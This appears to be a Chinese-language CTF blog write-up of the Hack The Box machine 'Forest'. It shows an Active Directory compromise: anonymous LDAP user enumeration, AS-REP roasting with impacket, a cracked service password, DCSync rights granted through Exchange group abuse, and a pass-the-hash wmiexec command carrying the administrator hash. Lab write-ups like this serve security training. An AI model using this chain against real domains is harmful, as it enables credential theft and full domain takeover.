+++
title = '0X013 Forest'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'HTB'
+++



# 端口扫描

![](/htb_img/WEBRESOURCE93fdbc1cf8437edf1e751023e9ed1e2bimage.png)

![](/htb_img/WEBRESOURCE1e68350840d2018df4ed107ffb3f6c08image.png)

![](/htb_img/WEBRESOURCE033784e1aad5bf646aee9b3abd881f80image.png)

# 获取立足点

smb无法利用，但是ldap存在匿名访问：

![](/htb_img/WEBRESOURCEc2050611b4266ff071f8d900185cfb69image.png)

查询所有用户：

ldapsearch -x -H ldap://10.10.10.161:389 -u '' -w '' -b "DC=htb,DC=local" "(&(objectCategory=person)(objectClass=user))" |grep dn

![](/htb_img/WEBRESOURCEfe4307047ea47ceafd2b1efe1def47d1image.png)

经过一段处理：

把用户名提取出来：

![](/htb_img/WEBRESOURCE64f411aa6c41500447fed65e433ecdc4image.png)

拿到所有的用户名，几个想法：1、密码喷洒；2、AS-REP Roasting

用impacket工具包的GetNPUsers.py进行爆破，尝试获取hash

python ../impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 -usersfile username.txt -format john htb.local/

发现可用：

![](/htb_img/WEBRESOURCEca0d1df87d377c387427b0c959ac35b2image.png)

破解hash:

s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)

![](/htb_img/WEBRESOURCE8320a03326f3360b22481ebb4298c5b3image.png)

5985开启，可用通过winrm getshell:

![](/htb_img/WEBRESOURCEb8bd0e5f6b4ae711c2d344b99403dcacimage.png)

![](/htb_img/WEBRESOURCE43c068ea933f27d2853b15eddedeec1dimage.png)

# 提权

使用bloodhunnd:

![](/htb_img/WEBRESOURCEb54eddfd1c767692663810ea6b449e24image.png)

发现两条路径：

第一条是，CanPSRemote，通过登录来获取域管理员权限，但是前提是使用本地提权，然后DCSYNC，但是这条路不完全有效，后面看了一下，似乎不让读取系统信息，也就不要太好本地提权了：

![](/htb_img/WEBRESOURCE50639070763fb043c8fb3a628461dedfimage.png)

第二条是通过EXCHANGE WINDOWS PERMISSIONS@HTB.LOCALL这个组有完全控制权：bloodhound给的建议是给用户添加dcsync权限：

![](/htb_img/WEBRESOURCEb406f0a27830d6d156e8a207be4c40bfimage.png)

那么如何进入EXCHANGE WINDOWS PERMISSIONS@HTB.LOCALL组呢：

bloodhound告诉我们，SVC-ALFRESCO@HTB.LOCAL是可以通过添加账户来进入这个组的：

![](/htb_img/WEBRESOURCE792ebfdef5747d1d81ae5c24a92e0c70image.png)

![](/htb_img/WEBRESOURCE495dc5f8a8937ad595fbf4d6a65411d0image.png)

也就是说，我们可以赋予一个用户dcsync权限：

先使用SVC-ALFRESCO@HTB.LOCAL创建一个属于EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL组的用户：

![](/htb_img/WEBRESOURCE351f2b652dd56d12e721cf4940138cf2image.png)

赋予dcsync权限：

![](/htb_img/WEBRESOURCEc42f7017986b2e09894f010ae1c8c3fdimage.png)

不知道哪里有问题，secretsdump失败了，使用powershell脚本试试：

![](/htb_img/WEBRESOURCE370215061601254ca9e6e14ea4a5d1dfimage.png)

看来是权限没给上，再研究一下：

![](/htb_img/WEBRESOURCE45ae99d0685f7c8396171b6cfe27b8e3image.png)

给上了，这次导出hash成功了：

![](/htb_img/WEBRESOURCE1c34d374b8a9346efc38c2fdffe04374image.png)

hash登录：

wmiexec.py administrator@10.10.10.161 -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'

![](/htb_img/WEBRESOURCEbce8a514dc22193001326a4d636af659image.png)

a3c166fcef465897b552ea3f9d2c1eba

![](/htb_img/WEBRESOURCEd7ed52f53b34b26b7d7490ccd694531cimage.png)

# 总结

## 这个靶场的核心是使用bloodhound，对**bloodhound的使用和理解有一定要求，如果有域内扎实权限基础的话，会更好打一些**